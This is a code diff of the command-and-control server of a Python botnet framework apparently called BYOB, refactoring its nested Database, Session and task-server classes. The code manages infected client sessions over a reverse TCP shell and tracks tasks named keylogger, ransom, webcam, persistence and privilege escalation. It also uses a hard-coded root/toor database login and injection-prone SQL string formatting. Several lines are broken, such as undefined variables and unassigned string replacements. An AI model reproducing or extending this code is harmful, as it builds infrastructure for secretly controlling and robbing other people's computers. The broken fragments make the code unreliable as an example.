@@ -76,7 +76,7 @@ __doc__         = '''
 
 
 
-class C2(object):
+class C2():
 
     """
     Command & Control Server
@@ -110,7 +110,7 @@ class C2(object):
         pushes it back into the background
 
     ImportHandler
-        request handler for the C2.Server that handles the
+        request handler for the Server that handles the
         server-side of the client `remote import` feature, which 
         effectively allows clients to remotely import & use any 
         module that exists on the server as quickly and easily 
@@ -122,7 +122,7 @@ class C2(object):
         requests which have been sent by a client operating in
         passive mode, which utilizes a remote logger instance
         configured with a socket handler that connects to the
-        port number above the C2.Server primary listener port
+        port number above the Server primary listener port
     """
 
     _lock           = threading.Lock()
@@ -132,15 +132,14 @@ class C2(object):
     _prompt_style   = colorama.Style.BRIGHT
     
 
-    def __init__(self, **kwargs):
+    def __init__(self, port=1337, **kwargs):
         """
         Create a new C2 instance
 
         `Optional`
-        :param str mysql_host:  mysql database host (default: localhost)
-        :param int mysql_port:  mysql database port (default: 3306)
-        :param str mysql_user:  mysql username (default: root)
-        :param str mysql_pass:  mysql password (default: toor)
+        :param str host:      mysql hostname (default: localhost)
+        :param str user:      mysql username (default: root)
+        :param str password:  mysql password (default: toor)
         """
         self._count             = 1
         self._prompt            = None
@@ -150,7 +149,6 @@ class C2(object):
         self.current_session    = None
         self.port               = port
         self.commands           = self._init_commands()
-        self.config             = self._init_config(**kwargs)
         self.banner             = self._init_banner()
         self.database           = self._init_database()
         
@@ -227,7 +225,6 @@ class C2(object):
             'query'         :   self.query,
             'settings'      :   self.settings,
             'options'       :   self.settings,
-            'debug'         :   self.debug_mode,
             'sessions'      :   self.session_list,
             'clients'       :   self.session_list,
             'shell'         :   self.session_shell,
@@ -247,9 +244,9 @@ class C2(object):
 
     def _init_database(self, **kwargs):
         if all([kwargs.get(arg) for arg in ['host','user','password']]):
-            db = C2.Database(server=self, **kwargs)
+            db = Database(server=self, **kwargs)
         else:
-            db = C2.Database(server=self)
+            db = Database(server=self)
         with self._lock:
             util.display("[+] ", color='green', style='bright', end='')
             util.display("Connected to MySQL database", style='bright', color='reset')
@@ -297,7 +294,7 @@ class C2(object):
         sock.listen(10)
         while True:
             connection, address = sock.accept()
-            session = C2.Session(server=self, connection=connection, name=self._count)
+            session = Session(server=self, connection=connection, name=self._count)
             self.sessions[self._count] = session
             self._count  += 1
             session.start()                        
@@ -316,7 +313,7 @@ class C2(object):
                 port    = self.port + 1
             else:
                 globals()['_debugger'].debug("invalid port number '{}' in task handler".format(port))
-        task_server = C2.TaskServer(self, port=port)
+        task_server = Server(self, port=port)
         task_server.serve_until_stopped()
         return task_server
 
@@ -794,602 +791,600 @@ class C2(object):
         sys.exit(0)
         
 
-    class Database(mysql.connector.MySQLConnection):
+class Database(mysql.connector.MySQLConnection):
+    """
+    MySQL database connection designed to create
+    and maintain a persistent database of important
+    session information handled by the server.
+
+    It is built specifically to work with byob.server.Server
+    instances, and should only be used by a server or in
+    conjunction with a server.
+    
+    """
+
+    def __init__(self, host='localhost', user='root', password='toor', server=None, tasks=['escalate','keylogger','outlook','packetsniffer','persistence','phone','portscan','process','ransom','screenshot','webcam'], **kwargs):
+
         """
-        MySQL database connection designed to create
-        and maintain a persistent database of important
-        session information handled by the server.
+        Create new MySQL conection instance and setup the database
 
-        It is built specifically to work with byob.server.Server
-        instances, and should only be used by a server or in
-        conjunction with a server.
-        
+        `Required`
+        :param server:          byob.server.Server instance
+        :param str host:        hostname/IP address of MySQL host machine
+        :param str user:        authorized account username
+        :param str password:    authorized account password
+
+        `Optional`
+        :param list tasks:      list of commands/modules for database to store
         """
+        assert isinstance(server, C2), "argument 'server' must be a byob.C2 instance"
+        try:
+            super(Database, self).__init__(host=host, user=user, password=password)
+            self.config(host=host, user=user, password=password)
+            self.query      = self.cursor(dictionary=True)
+            self._server    = server
+            self._tasks     = tasks
+            self._debug     = globals().get('_debug')
+            self._color     = globals().get('_color')
+            self._setup     = self._init_setup()
+        except mysql.connector.ProgrammingError:
+            util.display("\nBYOB was unable to connect to MySQL.\nMake sure you have completed all of the following steps:\n    1) Install MySQL 5.5+ (download available at https://mysql.com)\n\t2) Start the mysqld service (run command `service mysql start`)    \n    3) Enter valid MySQL credentials as command-line arguments every time you start-up the server\n\t(Example: server.py --mysql-host localhost --mysql-user root --mysql-password toor)\n")
+            
 
-        def __init__(self, host='localhost', user='root', password='toor', server=None, tasks=['escalate','keylogger','outlook','packetsniffer','persistence','phone','portscan','process','ransom','screenshot','webcam'], **kwargs):
-
-            """
-            Create new MySQL conection instance and setup the database
-
-            `Required`
-            :param server:          byob.server.Server instance
-            :param str host:        hostname/IP address of MySQL host machine
-            :param str user:        authorized account username
-            :param str password:    authorized account password
-
-            `Optional`
-            :param list tasks:      list of commands/modules for database to store
-            """
-            assert isinstance(server, C2), "argument 'server' must be a byob.C2 instance"
-            try:
-                super(C2.Database, self).__init__(host=host, user=user, password=password)
-                self.config(host=host, user=user, password=password)
-                self.query      = self.cursor(dictionary=True)
-                self._server    = server
-                self._tasks     = tasks
-                self._debug     = globals().get('_debug')
-                self._color     = globals().get('_color')
-                self._setup     = self._init_setup()
-            except mysql.connector.ProgrammingError:
-                util.display("\nBYOB was unable to connect to MySQL.\nMake sure you have completed all of the following steps:\n    1) Install MySQL 5.5+ (download available at https://mysql.com)\n\t2) Start the mysqld service (run command `service mysql start`)    \n    3) Enter valid MySQL credentials as command-line arguments every time you start-up the server\n\t(Example: server.py --mysql-host localhost --mysql-user root --mysql-password toor)\n")
-                
-
-        def _display(self, data, indent=4):
-            if isinstance(data, dict):
-                for k,v in data.items():
-                    if isinstance(v, datetime.datetime):
-                        data[k] = v.ctime()
-                i = data.pop('id', None)
-                c = globals().get('_color') or util.color()
-                util.display(str(i).rjust(indent-3), color='reset', style='bright') if i else None
-                for k,v in data.items():
-                    if isinstance(v, unicode):
-                        try:
-                            j = json.loads(v.encode())
-                            self._display(j, indent+2)
-                        except:
-                            util.display(str(k).encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end='')
-                            util.display(str(v).encode(), color=c, style='dim')
-                    elif isinstance(v, list):
-                        for i in v:
-                            if isinstance(v, dict):
-                                util.display(str(k).ljust(4  * indent).center(5 * indent))
-                                self._display(v, indent+2)
-                            else:
-                                util.display(str(i).ljust(4  * indent).center(5 * indent))
-                    elif isinstance(v, dict):
-                        util.display(str(k).ljust(4  * indent).center(5 * indent))
-                        self._display(v, indent+1)
-                    elif isinstance(v, int):
-                        if v in (0,1):
-                            util.display(str(k).encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end='')
-                            util.display(str(bool(v)).encode(), color=c, style='dim')
+    def _display(self, data, indent=4):
+        if isinstance(data, dict):
+            for k,v in data.items():
+                if isinstance(v, datetime.datetime):
+                    data[k] = v.ctime()
+            i = data.pop('id', None)
+            c = globals().get('_color') or util.color()
+            util.display(str(i).rjust(indent-3), color='reset', style='bright') if i else None
+            for k,v in data.items():
+                if isinstance(v, unicode):
+                    try:
+                        j = json.loads(v.encode())
+                        self._display(j, indent+2)
+                    except:
+                        util.display(str(k).encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end='')
+                        util.display(str(v).encode(), color=c, style='dim')
+                elif isinstance(v, list):
+                    for i in v:
+                        if isinstance(v, dict):
+                            util.display(str(k).ljust(4  * indent).center(5 * indent))
+                            self._display(v, indent+2)
                         else:
-                            util.display(str(k).encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end='')
-                            util.display(str(v).encode(), color=c, style='dim')
+                            util.display(str(i).ljust(4  * indent).center(5 * indent))
+                elif isinstance(v, dict):
+                    util.display(str(k).ljust(4  * indent).center(5 * indent))
+                    self._display(v, indent+1)
+                elif isinstance(v, int):
+                    if v in (0,1):
+                        util.display(str(k).encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end='')
+                        util.display(str(bool(v)).encode(), color=c, style='dim')
                     else:
                         util.display(str(k).encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end='')
                         util.display(str(v).encode(), color=c, style='dim')
-            elif isinstance(data, list):
-                for row in data:
-                    if isinstance(row, dict):
-                        self._display(row, indent+2)
-                    else:
-                        util.display(str(row).encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end='')
-                        util.display(str(v).encode(), color=c, style='dim')
+                else:
+                    util.display(str(k).encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end='')
+                    util.display(str(v).encode(), color=c, style='dim')
+        elif isinstance(data, list):
+            for row in data:
+                if isinstance(row, dict):
+                    self._display(row, indent+2)
+                else:
+                    util.display(str(row).encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end='')
+                    util.display(str(v).encode(), color=c, style='dim')
+
+        else:
+            if hasattr(data, '_asdict'):
+                data = data._asdict()
+            if isinstance(data, collections.OrderedDict):
+                data = dict(data)
+            if isinstance(data, dict):
+                i = data.pop('id',None)
+                util.display(str(i).rjust(indent-1), color='reset', style='bright') if i else None
+                self._display(data, indent+2)
 
             else:
-                if hasattr(data, '_asdict'):
-                    data = data._asdict()
-                if isinstance(data, collections.OrderedDict):
-                    data = dict(data)
-                if isinstance(data, dict):
-                    i = data.pop('id',None)
-                    util.display(str(i).rjust(indent-1), color='reset', style='bright') if i else None
-                    self._display(data, indent+2)
-
-                else:
-                    util.display(str(data.encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end=''))
-                    util.display(v.encode(), color=c, style='dim')
+                util.display(str(data.encode().ljust(4  * indent).center(5 * indent), color=c, style='bright', end=''))
+                util.display(v.encode(), color=c, style='dim')
 
 
-        def _reconnect(self):
-            try:
-                self.reconnect()
-                self.query = self.cursor(dictionary=True)
-                return "[{} @ {}] reconnected".format(self.database.user, self.database.server_host)
-            except Exception as e:
-                self.error("{} error: {}".format(self._reconnect.func_name, str(e)))
+    def _reconnect(self):
+        try:
+            self.reconnect()
+            self.query = self.cursor(dictionary=True)
+            return "[{} @ {}] reconnected".format(self.database.user, self.database.server_host)
+        except Exception as e:
+            self.error("{} error: {}".format(self._reconnect.func_name, str(e)))
 
-        def _init_setup(self, batch_file='resources/setup.sql'):
-            overwrite   = False
-            with open(batch_file, 'r') as fd:
-                sql = fd.read()
-            if self.user != 'root':
-                overwrite = True
-                sql.replace('`root`', '`%s`' % self.user)
-            if self.server_host != 'localhost':
-                overwrite = True
-                sql.replace('`localhost`', '`%s`' % self.server_host)
-            if overwrite:
-                with file(batch_file, 'w') as fp:
-                    fp.write(sql)                    
-            self.execute_file(batch_file)
-            self.cmd_init_db('byob')
-            return True        
+    def _init_setup(self, batch_file='resources/setup.sql'):
+        overwrite   = False
+        with open(batch_file, 'r') as fd:
+            sql = fd.read()
+        if self.user != 'root':
+            overwrite = True
+            sql.replace('`root`', '`%s`' % self.user)
+        if self.server_host != 'localhost':
+            overwrite = True
+            sql.replace('`localhost`', '`%s`' % self.server_host)
+        if overwrite:
+            with file(batch_file, 'w') as fp:
+                fp.write(sql)                    
+        self.execute_file(batch_file)
+        self.cmd_init_db('byob')
+        return True        
 
-        def debug(self, output):
-            """
-            Print debugging output to console
-            """
-            globals()['_debugger'].debug(str(output))
+    def debug(self, output):
+        """
+        Print debugging output to console
+        """
+        globals()['_debugger'].debug(str(output))
 
-                
-        def error(self, output):
-            """
-            Print error output to console
             
-            """
-            self._server._error(str(output))
+    def error(self, output):
+        """
+        Print error output to console
+        
+        """
+        self._server._error(str(output))
 
 
-        def update_status(self, session, online):
-            """
-            Update session status to online/offline
+    def update_status(self, session, online):
+        """
+        Update session status to online/offline
 
-            `Required`
-            :param int session:     session ID
-            :param bool online:     True/False = online/offline
-            
-            """
-            try:
-                if online:
-                    if isinstance(session, str):
-                        self.execute_query("UPDATE tbl_sessions SET online=1 WHERE uid='%s'" % str(session))
-                    elif isinstance(session, int):
-                        self.execute_query("UPDATE tbl_sessions SET online=1 WHERE id=%d" % int(session))
-                else:
-                    if isinstance(session, str):
-                        self.execute_query("UPDATE tbl_sessions SET online=0, last_online=NOW() WHERE uid='%s'" % str(session))
-                    elif isinstance(session, int):
-                        self.execute_query("UPDATE tbl_sessions SET online=0, last_online=NOW() WHERE id=%d" % int(session))                  
-            except Exception as e:
-                self.error("{} error: {}".format(self.update_status.func_name, str(e)))
-
-
-        def get_sessions(self, verbose=False, display=False):
-            """
-            Fetch sessions from database
-
-            `Optional`
-            :param bool verbose:    include full session information
-            :param bool display:    display output
-            
-            """
-            sessions = self.execute_query("SELECT * FROM tbl_sessions ORDER BY online" if verbose else "SELECT id, public_ip, uid, last_online FROM tbl_sessions ORDER BY online desc")   
-            if display:
-                self._display(sessions)
-            return sessions
+        `Required`
+        :param int session:     session ID
+        :param bool online:     True/False = online/offline
+        
+        """
+        try:
+            if online:
+                if isinstance(session, str):
+                    self.execute_query("UPDATE tbl_sessions SET online=1 WHERE uid='%s'" % str(session))
+                elif isinstance(session, int):
+                    self.execute_query("UPDATE tbl_sessions SET online=1 WHERE id=%d" % int(session))
+            else:
+                if isinstance(session, str):
+                    self.execute_query("UPDATE tbl_sessions SET online=0, last_online=NOW() WHERE uid='%s'" % str(session))
+                elif isinstance(session, int):
+                    self.execute_query("UPDATE tbl_sessions SET online=0, last_online=NOW() WHERE id=%d" % int(session))                  
+        except Exception as e:
+            self.error("{} error: {}".format(self.update_status.func_name, str(e)))
 
 
-        def get_tasks(self, session=None, display=True):
-            """
-            Fetch tasks from database
+    def get_sessions(self, verbose=False, display=False):
+        """
+        Fetch sessions from database
 
-            `Optional`
-            :param int session:     session ID
-            :param bool display:    display output
-            """
-            try:
-                tasks = None
-                if session:
+        `Optional`
+        :param bool verbose:    include full session information
+        :param bool display:    display output
+        
+        """
+        sessions = self.execute_query("SELECT * FROM tbl_sessions ORDER BY online" if verbose else "SELECT id, public_ip, uid, last_online FROM tbl_sessions ORDER BY online desc")   
+        if display:
+            self._display(sessions)
+        return sessions
+
+
+    def get_tasks(self, session=None, display=True):
+        """
+        Fetch tasks from database
+
+        `Optional`
+        :param int session:     session ID
+        :param bool display:    display output
+        """
+        try:
+            tasks = None
+            if session:
+                try:
+                    tasks = self.execute_query("SELECT * FROM {}".format(session), display=False)
+                except Exception as e:
+                    self.error("{} error: {}".format(self.show_results.func_name, str(e)))
+            else:
+                for session in self._get_sessions():
                     try:
-                        tasks = self.execute_query("SELECT * FROM {}".format(session), display=False)
+                        tasks = self.execute_query("SELECT * FROM {}", display=False)
                     except Exception as e:
-                        self.error("{} error: {}".format(self.show_results.func_name, str(e)))
-                else:
-                    for session in self._get_sessions():
-                        try:
-                            tasks = self.execute_query("SELECT * FROM {}", display=False)
-                        except Exception as e:
-                            self.debug("{} error: {}".format(self.show_results.func_name, str(e)))
-                if tasks:
-                    if display:
-                        self._display(tasks)
-                    return tasks
-            except Exception as e:
-                self.error("{} error: {}".format(self.get_tasks.func_name, str(e)))
+                        self.debug("{} error: {}".format(self.show_results.func_name, str(e)))
+            if tasks:
+                if display:
+                    self._display(tasks)
+                return tasks
+        except Exception as e:
+            self.error("{} error: {}".format(self.get_tasks.func_name, str(e)))
 
 
-        def handle_session(self, info):
-            """
-            Handle a new/current client by adding/updating database
+    def handle_session(self, info):
+        """
+        Handle a new/current client by adding/updating database
 
-            `Required`
-            :param dict info:    session host machine information
+        `Required`
+        :param dict info:    session host machine information
 
-            Returns the session information as a dictionary (JSON) object
-            """
+        Returns the session information as a dictionary (JSON) object
+        """
+        if isinstance(info, dict):
+            args = (json.dumps(info), '@session')
+            _    = self.execute_procedure('sp_handle_session', args=args, display=False)
+            info = self.execute_query('SELECT @session', display=False)
+            if isinstance(info, list) and len(info):
+                info = info[0]
             if isinstance(info, dict):
-                args = (json.dumps(info), '@session')
-                _    = self.execute_procedure('sp_handle_session', args=args, display=False)
-                info = self.execute_query('SELECT @session', display=False)
-                if isinstance(info, list) and len(info):
-                    info = info[0]
-                if isinstance(info, dict):
-                    return info
-                else:
-                    self.error("Error: invalid output type returned from database (expected '{}', receieved '{}')".format(dict, type(data)))
+                return info
             else:
-                self.error("Error: invalid output type returned from database (expected '{}', receieved '{}')".format(dict, type(info)))
+                self.error("Error: invalid output type returned from database (expected '{}', receieved '{}')".format(dict, type(data)))
+        else:
+            self.error("Error: invalid output type returned from database (expected '{}', receieved '{}')".format(dict, type(info)))
 
 
-        def handle_task(self, task):
-            """ 
-            Adds results to database for configured task type
+    def handle_task(self, task):
+        """ 
+        Adds results to database for configured task type
 
-            `Required`
-            :param dict task:
-              :attr str task.client:          client ID assigned by server
-              :attr str task.task:            task assigned by server
+        `Required`
+        :param dict task:
+          :attr str task.client:          client ID assigned by server
+          :attr str task.task:            task assigned by server
 
-            `Optional`
-              :attr str task.uid:             task ID assigned by server
-              :attr str task.result:          task result completed by client
-              :attr datetime task.issued:     time task was issued by server
-              :attr datetime task.completed:  time task was completed by client
+        `Optional`
+          :attr str task.uid:             task ID assigned by server
+          :attr str task.result:          task result completed by client
+          :attr datetime task.issued:     time task was issued by server
+          :attr datetime task.completed:  time task was completed by client
 
-            Returns task assigned by database as a dictionary (JSON) object
-            """
-            try:
+        Returns task assigned by database as a dictionary (JSON) object
+        """
+        try:
+            if isinstance(task, dict):
+                args = (json.dumps(task), '@task')
+                _ = self.execute_procedure("sp_handle_task", args=args)
+                task = self.execute_query("SELECT @task")
+                if isinstance(task, list) and len(task):
+                    task = task[0]
                 if isinstance(task, dict):
-                    args = (json.dumps(task), '@task')
-                    _ = self.execute_procedure("sp_handle_task", args=args)
-                    task = self.execute_query("SELECT @task")
-                    if isinstance(task, list) and len(task):
-                        task = task[0]
-                    if isinstance(task, dict):
-                        return task
-                else:
-                    self.error("{} error: invalid input type (expected {}, received {})".format(self.handle_task.func_name, dict, type(task)))
-            except Exception as e:
-                self.error("{} error: {}".format(self.handle_task.func_name, str(e)))
+                    return task
+            else:
+                self.error("{} error: invalid input type (expected {}, received {})".format(self.handle_task.func_name, dict, type(task)))
+        except Exception as e:
+            self.error("{} error: {}".format(self.handle_task.func_name, str(e)))
 
 
-        def execute_query(self, query, display=False):
-            """
-            Execute a query and return result, optionally printing output to stdout
+    def execute_query(self, query, display=False):
+        """
+        Execute a query and return result, optionally printing output to stdout
 
-            `Required`
-            :param str query:   SQL statement to execute in MySQL
+        `Required`
+        :param str query:   SQL statement to execute in MySQL
 
-            Returns a list of output rows formatted as dictionary (JSON) objects
-            """
+        Returns a list of output rows formatted as dictionary (JSON) objects
+        """
+        result = []
+        try:
+            if not self.is_connected():
+                self._reconnect()
             result = []
-            try:
-                if not self.is_connected():
-                    self._reconnect()
-                result = []
-                self.query.execute(query)
-                output = self.query.fetchall()
-                if output:
-                    for row in output:
-                        if hasattr(row, '_asdict'):
-                            row = row._asdict()
-                        for key,value in [(key,value) for key,value in row.items() if isinstance(value, datetime.datetime)]:
-                            row[key] = value.ctime()
-                        if display:
-                            self._display(row)
-                        result.append(row)
-            except (mysql.connector.ProgrammingError, mysql.connector.InterfaceError) as e:
-                self.error(e)
-            except Exception as e:
-                self.error("{} error: {}".format(self.execute_query.func_name, str(e)))
-            finally:
-                return result
+            self.query.execute(query)
+            output = self.query.fetchall()
+            if output:
+                for row in output:
+                    if hasattr(row, '_asdict'):
+                        row = row._asdict()
+                    for key,value in [(key,value) for key,value in row.items() if isinstance(value, datetime.datetime)]:
+                        row[key] = value.ctime()
+                    if display:
+                        self._display(row)
+                    result.append(row)
+        except (mysql.connector.ProgrammingError, mysql.connector.InterfaceError) as e:
+            self.error(e)
+        except Exception as e:
+            self.error("{} error: {}".format(self.execute_query.func_name, str(e)))
+        finally:
+            return result
 
 
-        def execute_procedure(self, procedure, args=[], display=False):
-            """
-            Execute a stored procedure and return result, optionally printing output to stdout
+    def execute_procedure(self, procedure, args=[], display=False):
+        """
+        Execute a stored procedure and return result, optionally printing output to stdout
 
-            `Required`
-            :param str procedure:   name of the stored procedure to execute
+        `Required`
+        :param str procedure:   name of the stored procedure to execute
 
-            `Optional`
-            :param list args:       list of arguments to pass to the stored procedure
-            :param bool display:    display output from Database if True
+        `Optional`
+        :param list args:       list of arguments to pass to the stored procedure
+        :param bool display:    display output from Database if True
 
-            Returns a list of output rows formatted as dictionary (JSON) objects
-            """
+        Returns a list of output rows formatted as dictionary (JSON) objects
+        """
+        result = []
+        try:
+            if not self.is_connected():
+                self._reconnect()
+            cursor = self.cursor(dictionary=True)
+            cursor.callproc(procedure, args)
+            result = [row for row in cursor.stored_results() for row in result.fetchall()]
+        except (mysql.connector.InterfaceError, mysql.connector.ProgrammingError):
+            pass
+        finally:
+            return result
+
+
+    def execute_file(self, filename=None, sql=None, display=False):
+        """
+        Execute SQL commands sequentially from a string or file
+
+        `Optional`
+        :param str filename:    name of the SQL batch file to execute
+        :param str sql:         raw SQL commands to execute
+        :param bool display:    display output from Database if True
+
+        Returns a list of output rows formatted as dictionary (JSON) objects
+        """
+        try:
             result = []
-            try:
-                if not self.is_connected():
-                    self._reconnect()
-                cursor = self.cursor(dictionary=True)
-                cursor.callproc(procedure, args)
-                result = [row for row in cursor.stored_results() for row in result.fetchall()]
-            except (mysql.connector.InterfaceError, mysql.connector.ProgrammingError):
-                pass
-            finally:
-                return result
-
-
-        def execute_file(self, filename=None, sql=None, display=False):
-            """
-            Execute SQL commands sequentially from a string or file
-
-            `Optional`
-            :param str filename:    name of the SQL batch file to execute
-            :param str sql:         raw SQL commands to execute
-            :param bool display:    display output from Database if True
-
-            Returns a list of output rows formatted as dictionary (JSON) objects
-            """
-            try:
-                result = []
-                if os.path.isfile(filename):
-                    with open(filename) as stmts:
-                        for line in self.query.execute(stmts.read(), multi=True):
-                            result.append(line)
-                            if display:
-                                print(line)
-                elif isinstance(sql, str):
-                    for line in self.query.execute(sql, multi=True):
+            if os.path.isfile(filename):
+                with open(filename) as stmts:
+                    for line in self.query.execute(stmts.read(), multi=True):
                         result.append(line)
                         if display:
                             print(line)
-                elif isinstance(sql, list) or isinstance(sql, tuple):
-                    sql = '\n'.join(sql)
-                    for line in self.query.execute_query(sql, multi=True):
-                         result.append(line)
-                         if display:
-                             print(line)
-                return result
-            except Exception as e:
-                self.error("{} error: {}".format(self.execute_file.func_name, str(e)))
+            elif isinstance(sql, str):
+                for line in self.query.execute(sql, multi=True):
+                    result.append(line)
+                    if display:
+                        print(line)
+            elif isinstance(sql, list) or isinstance(sql, tuple):
+                sql = '\n'.join(sql)
+                for line in self.query.execute_query(sql, multi=True):
+                     result.append(line)
+                     if display:
+                         print(line)
+            return result
+        except Exception as e:
+            self.error("{} error: {}".format(self.execute_file.func_name, str(e)))
 
-    class Session(threading.Thread):
+class Session(threading.Thread):
+    """
+    Thread responsible for a client session
+
+    - Active
+        handles the server-side of the
+        reverse TCP shell while the session
+        is active
+
+    - Passive
+        passively manages the session while
+        it is operating in passive mode to
+        keep the socket connection alive
+
+    """
+    def __init__(self, connection=None, server=None, id=1):
         """
-        Thread responsible for a client session
+        Create a new Session instance
 
-        - Active
-            handles the server-side of the
-            reverse TCP shell while the session
-            is active
-
-        - Passive
-            passively manages the session while
-            it is operating in passive mode to
-            keep the socket connection alive
-
+        `Requires`
+        :param connection:   connected socket object
+        :param server:       byob.server.Server instance
+        :param int id:       session ID
+        
         """
-        def __init__(self, connection=None, server=None, id=1):
-            """
-            Create a new Session instance
-
-            `Requires`
-            :param connection:   connected socket object
-            :param server:       byob.server.Server instance
-            :param int id:       session ID
-            
-            """
-            super(C2.Session, self).__init__()
-            self._server    = server
-            self._prompt    = None
-            self._active    = threading.Event()
-            self._created   = time.time()
-            self.id         = id
-            self.connection = connection
-            self.key        = security.diffiehellman(self.connection)
-            self.info       = self._info()
+        super(Session, self).__init__()
+        self._server    = server
+        self._prompt    = None
+        self._active    = threading.Event()
+        self._created   = time.time()
+        self.id         = id
+        self.connection = connection
+        self.key        = security.diffiehellman(self.connection)
+        self.info       = self._info()
 
 
-        def _client_prompt(self, data):
-            with Server._lock:
-                return raw_input(globals()['_threads']['server']._prompt_color + globals()['_threads']['server']._prompt_style + '\n' + bytes(data).rstrip())
+    def _client_prompt(self, data):
+        with Server._lock:
+            return raw_input(globals()['c2']._prompt_color + globals()['c2']._prompt_style + '\n' + bytes(data).rstrip())
 
 
-        def _error(self, data):
-            with Server._lock:
-                print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.RESET + colorama.Style.DIM + 'Client {} Error: '.format(self.session) + bytes(data) + '\n')
+    def _error(self, data):
+        with self._lock:
+            util.display('[-] ', color='red', style='bright', end='')
+            util.display('Client {} Error: {}'.format(self.session, bytes(data)), color='reset', style='dim')
 
 
-        def _kill(self):
-            self._active.clear()
-            globals()['_threads']['server'].session_remove(self.session)
-            globals()['_threads']['server'].current_session = None
-            globals()['_threads']['server']._active.set()
-            globals()['_threads']['server'].run()
+    def _kill(self):
+        self._active.clear()
+        globals()['c2'].session_remove(self.session)
+        globals()['c2'].current_session = None
+        globals()['c2']._active.set()
+        globals()['c2'].run()
 
 
-        def _info(self):
+    def _info(self):
+        try:
+            header_size = struct.calcsize("L")
+            header      = self.connection.recv(header_size)
+            msg_size    = struct.unpack(">L", header)[0]
+            msg         = ""
+            while len(msg) < msg_size:
+                msg += self.connection.recv(1)
+            if msg:
+                info = security.decrypt_aes(msg, self.key)
+                info = json.loads(data)
+                info2 = globals()['c2'].database.handle_session(info)
+                if isinstance(info2, dict):
+                    info = info2
+                globals()['c2'].send_task(json.dumps(info), session=self.session)
+                return info
+        except Exception as e:
+            self._error(str(e))
+
+
+    def status(self):
+        """
+        Check the status and duration of the session
+        
+        """
+        try:
+            c = time.time() - float(self._created)
+            data=['{} days'.format(int(c / 86400.0)) if int(c / 86400.0) else str(),
+                  '{} hours'.format(int((c % 86400.0) / 3600.0)) if int((c % 86400.0) / 3600.0) else str(),
+                  '{} minutes'.format(int((c % 3600.0) / 60.0)) if int((c % 3600.0) / 60.0) else str(),
+                  '{} seconds'.format(int(c % 60.0)) if int(c % 60.0) else str()]
+            return ', '.join([i for i in data if i])
+        except Exception as e:
+            return "{} error: {}".format(self.status.func_name, str(e))
+
+
+    def run(self):
+        """
+        Run a reverse TCP shell
+        
+        """
+        while True:
             try:
-                header_size = struct.calcsize("L")
-                header      = self.connection.recv(header_size)
-                msg_size    = struct.unpack(">L", header)[0]
-                msg         = ""
-                while len(msg) < msg_size:
-                    msg += self.connection.recv(1)
-                if msg:
-                    info = security.decrypt_aes(msg, self.key)
-                    info = json.loads(data)
-                    info2 = globals()['_threads']['server'].database.handle_session(info)
-                    if isinstance(info2, dict):
-                        info = info2
-                    globals()['_threads']['server'].send_task(json.dumps(info), session=self.session)
-                    return info
-            except Exception as e:
-                self._error(str(e))
+                if self._active.wait():
+                    
+                    task = globals()['c2'].recv_task(session=self.id) if not self._prompt else self._prompt
 
-
-        def status(self):
-            """
-            Check the status and duration of the session
-            
-            """
-            try:
-                c = time.time() - float(self._created)
-                data=['{} days'.format(int(c / 86400.0)) if int(c / 86400.0) else str(),
-                      '{} hours'.format(int((c % 86400.0) / 3600.0)) if int((c % 86400.0) / 3600.0) else str(),
-                      '{} minutes'.format(int((c % 3600.0) / 60.0)) if int((c % 3600.0) / 60.0) else str(),
-                      '{} seconds'.format(int(c % 60.0)) if int(c % 60.0) else str()]
-                return ', '.join([i for i in data if i])
-            except Exception as e:
-                return "{} error: {}".format(self.status.func_name, str(e))
-
-
-        def run(self):
-            """
-            Run a reverse TCP shell
-            
-            """
-            while True:
-                try:
-                    if self._active.wait():
+                    if 'help' in task.get('task'):
+                        self._active.clear()
+                        globals()['c2'].help(task.get('result'))
+                        self._active.set()
                         
-                        task = globals()['_threads']['server'].recv_task(session=self.id) if not self._prompt else self._prompt
+                    elif 'prompt' in task.get('task'):                        
+                        self._prompt = task
+                        command = self._client_prompt(task.get('result') % int(self.id))
+                        cmd, _, action  = command.partition(' ')
+                        
+                        if cmd in ('\n', ' ', ''):
+                            continue
 
-                        if 'help' in task.get('task'):
-                            self._active.clear()
-                            globals()['_threads']['server'].help(task.get('result'))
-                            self._active.set()
-                            
-                        elif 'prompt' in task.get('task'):                        
-                            self._prompt = task
-                            command = self._client_prompt(task.get('result') % int(self.id))
-                            cmd, _, action  = command.partition(' ')
-                            
-                            if cmd in ('\n', ' ', ''):
-                                continue
-
-                            elif cmd in globals()['_threads']['server'].commands and cmd != 'help':                            
-                                result = globals()['_threads']['server'].commands[cmd](action) if len(action) else globals()['_threads']['server'].commands[cmd]()
-                                if result:
-                                    task = {'task': cmd, 'result': result, 'session': self.info.get('uid')}
-                                    globals()['_threads']['server'].display(result)
-                                    globals()['_threads']['server'].database.handle_task(task)
-                                continue
-
-                            else:
-                                task = {'task': command, 'session': self.info.get('uid')}
-                                globals()['_threads']['server'].database.handle_task(task)
-                                globals()['_threads']['server'].send_task(task, session=self.id)
+                        elif cmd in globals()['c2'].commands and cmd != 'help':                            
+                            result = globals()['c2'].commands[cmd](action) if len(action) else globals()['c2'].commands[cmd]()
+                            if result:
+                                task = {'task': cmd, 'result': result, 'session': self.info.get('uid')}
+                                globals()['c2'].display(result)
+                                globals()['c2'].database.handle_task(task)
+                            continue
 
                         else:
-                            if task.get('result') and task.get('result') != 'None':
-                                globals()['_threads']['server'].display(task.get('result'))
-                                globals()['_threads']['server'].database.handle_task(task)
+                            task = {'task': command, 'session': self.info.get('uid')}
+                            globals()['c2'].database.handle_task(task)
+                            globals()['c2'].send_task(task, session=self.id)
 
-                        if globals()['_abort']:
-                            break
-                        
-                        self._prompt = None
-                        
-                except Exception as e:
-                    self._error(str(e))
-                    time.sleep(1)
-                    break
-                
-            self._active.clear()
-            globals()['_threads']['server']._return()
-
-    class TaskServer(SocketServer.ThreadingTCPServer):
-        """
-        - Remote imports
-            hosts Python packages and user-defined modules
-            for remote importing by authenticated sessions
-
-        - Resource requests 
-            serves files/resources requested by sessions 
